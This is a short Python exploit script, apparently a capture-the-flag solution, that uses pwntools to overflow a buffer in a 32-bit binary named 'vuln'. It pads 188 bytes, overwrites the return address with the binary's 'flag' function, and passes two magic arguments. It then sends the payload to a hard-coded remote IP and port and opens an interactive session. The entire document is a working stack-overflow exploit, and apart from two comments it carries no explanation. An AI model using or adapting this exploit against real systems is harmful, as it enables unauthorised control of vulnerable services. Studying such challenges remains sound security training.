from pwn import *

context.update(arch="i386", os="linux")

elf = ELF("./vuln")

# offset to reach right before return address's location
offset = b"A" * 188

# craft exploit: offset + flag()
exploit = offset + p32(elf.symbols['flag'], endian="little")  + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = remote("167.172.55.170", 32272)
#r = elf.process()
r.sendlineafter(":", exploit)
r.interactive()
